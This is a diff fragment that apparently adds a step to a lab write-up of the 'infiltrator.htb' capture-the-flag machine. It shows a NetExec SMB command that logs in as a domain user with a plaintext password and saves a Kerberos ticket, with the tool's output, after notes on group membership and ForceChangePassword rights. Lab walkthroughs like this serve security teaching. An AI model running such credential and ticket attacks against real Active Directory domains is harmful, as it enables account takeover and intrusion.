@@ -398,4 +398,10 @@ This added the user to the group
 
 This user has ForceChangePassword on the `m.harris` user
 
-
+```python
+nxc smb dc01.infiltrator.htb -u e.rodriguez -p 'Password123!' -k --generate-tgt e.rodriguez
+SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\e.rodriguez:Password123! 
+SMB         dc01.infiltrator.htb 445    DC01             [+] TGT saved to: e.rodriguez.ccache
+SMB         dc01.infiltrator.htb 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=e.rodriguez.ccache
+```
